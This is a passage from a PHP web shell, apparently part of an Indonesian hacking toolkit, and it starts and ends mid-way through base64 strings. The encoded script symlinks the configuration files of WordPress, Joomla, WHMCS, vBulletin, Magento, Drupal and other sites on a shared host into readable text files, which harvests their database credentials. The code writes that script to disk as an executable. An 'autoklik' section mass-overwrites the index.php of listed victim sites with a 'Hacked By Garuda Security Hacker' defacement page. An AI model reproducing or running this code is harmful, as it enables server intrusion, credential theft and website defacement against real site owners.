XRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictNC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dwL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvV1Avd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLXByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2cvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ldy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLW5ldy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9nL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9ncy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLWJsb2dzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1ob21lLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Byb3RhbC93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3Mtc2l0ZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYWluL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy90ZXN0L3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtdGVzdC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJjYWRlL2Z1bmN0aW9ucy9kYmNsYXNzLnBocCcsJHNpdGVzcy4nLWlicHJvYXJjYWRlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9qb28vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb28udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLWNtcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1tYWluLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtaG9tZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmJ+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIzfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jYy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIxfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobTE1LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tY2VudHJhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0td2htY3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL1dITUNTL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLVdITUNTLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htYy1XSE0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNwYW5lbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXBhbmVsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VibWl0dGlja2V0LnBocCcsJHNpdGVzcy4nLXdobWNzMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbWFuYWdlLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9teS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW15c2hvcC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictemVuY2FydC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1aQ3Nob3AudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc21mL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZjIudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW1zL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bXMudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJ0aWNsZS9jb25maWcucGhwJywkc2l0ZXNzLictTndhaHkudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy11cDIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZl9nbG9iYWwucGhwJywkc2l0ZXNzLictNi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlL2RiLnBocCcsJHNpdGVzcy4nLTcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29ubmVjdC5waHAnLCRzaXRlc3MuJy1QSFAtRnVzaW9uLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21rX2NvbmYucGhwJywkc2l0ZXNzLictOS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJHNpdGVzcy4nLURydXBhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXIvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy0xbWVtYmVyLnR4dCcpIDsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5ncy50eHQnKSA7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3JlcXVpcmVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1BTTRTUy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1cHBvcnRzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1zdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtYmlsbGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1iaWxsaW5ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0L2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3QudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdHMvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGluZy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmdzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RpbmdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RiaWxsaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcC9ldGMvbG9jYWwueG1sJywkc2l0ZXNzLictTWFnZW50by50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictT3BlbmNhcnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCRzaXRlc3MuJy1QcmVzdGFzaG9wLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy9rb25la3NpLnBocCcsJHNpdGVzcy4nLUxva29tZWRpYS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9sb2tvbWVkaWEvY29uZmlnL2tvbmVrc2kucGhwJywkc2l0ZXNzLictTG9rb21lZGlhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NsY29uZmlnLnBocCcsJHNpdGVzcy4nLVNpdGVsb2NrLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCRzaXRlc3MuJy1FbGxpc2xhYi50eHQnKTsNCn0NCnByaW50ICI8YnI+PGJyPjxicj48Zm9udCBjb2xvcj1yZWQ+RG9uZSAhISA8aW1nIHNyYz0naHR0cDovL2kuaW1ndXIuY29tL0x0dWtFSk4ucG5nJyAgaGVpZ2h0PSc3MCcgd2lkdGg9JzYwJz48L2ZvbnQ+IjsNCg==';
$file = fopen("vhost.cin" ,"w+");
$write = fwrite ($file ,base64_decode($xaivhost));
fclose($file);
    chmod("vhost.cin",0755);
   echo "<a href='vhost'>Klik Ini</a>";
}
?>
</body>
</html>
<?php
} elseif($_GET['gsh'] == 'ende') {

@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
$text = $_POST['mbutt'];
} elseif($_GET['gsh'] == 'autoklik') {
?>
<form method="post">
<input type="submit" name="x" value="index.php">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['x']) {
	foreach($target as $korban) {
		$global = "index.php";
		$isi_nama_doang = "PHRpdGxlPkxvY2tlZDwvdGl0bGU+DQo8c3R5bGU+DQpib2R5ew0KdGV4dC1zaGFkb3c6MnB4IDJweCAxcHggYmx1ZTsNCn0NCmh0bWwgew0KCSBiYWNrZ3JvdW5kOiB1cmwoaHR0cHM6Ly9zY29udGVudC1zaW42LTEueHguZmJjZG4ubmV0L3YvdDEuMC0wL3M1NTJ4NDE0LzE1OTY1NTMxXzE5MTc4Nzg2MDUxMDY2MzNfODE4MDM5MjkyMzE4MzIyMzcxMF9uLmpwZz9vaD1kZDUwNGM1YTEyODU3MzFiMTQ0MDg0YWUzZGVkZDkyMSZvZT01OTExOEI2OSkgbm8tcmVwZWF0IGNlbnRlciBjZW50ZXIgZml4ZWQ7IA0KICAtd2Via2l0LWJhY2tncm91bmQtc2l6ZTogY292ZXI7DQogIC1tb3otYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgLW8tYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgICBjb2xvcjogI2ZmZmZmZjsNCiAgICBmb250LWZhbWlseTogJ1VidW50dSc7DQoJZm9udC1zaXplOiAxM3B4Ow0KCXdpZHRoOiAxMDAlOw0KfQ0KPC9zdHlsZT4NCjxjZW50ZXI+PGZvbnQgY29sb3I9InJlZCI+PHN0cm9uZz48Zm9udCBzaXplPSI0Ij5IYWNrZWQgQnkgR2FydWRhIFNlY3VyaXR5IEhhY2tlcjwvZm9udD48L3N0cm9uZz48L2ZvbnQ+PGNlbnRlcj4NCjxzY3JpcHQ+dmFyIGc9NTAsZj1uZXcgQXJyYXkoIiNBQUFBQ0MiLCIjREREREZGIiwiI0NDQ0NERCIsIiNGM0YzRjMiLCIjRjBGRkZGIiksZT1uZXcgQXJyYXkoIkFyaWFsIEJsYWNrIiwiQXJpYWwgTmFycm93IiwiVGltZXMiLCJDb21pYyBTYW5zIE1TIiksZD0iKiIsbT0wLjYsYT0yMixiPTgsYz0xLGo9bmV3IEFycmF5KCksayxsLHgsbj1uZXcgQXJyYXkoKSxvPW5ldyBBcnJheSgpLHA9bmV3IEFycmF5KCkscT1uYXZpZ2F0b3IudXNlckFnZW50LHI9ZG9jdW1lbnQuYWxsJiZkb2N1bWVudC5nZXRFbGVtZW50QnlJZCYmIXEubWF0Y2goL09wZXJhLykscz1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCYmIWRvY3VtZW50LmFsbCx1PXEubWF0Y2goL09wZXJhLyksdD1yfHxzfHx1O2Z1bmN0aW9uIHkoeil7cmV0dXJuIE1hdGguZmxvb3IoeipNYXRoLnJhbmRvbSgpKX1mdW5jdGlvbiB2KCl7a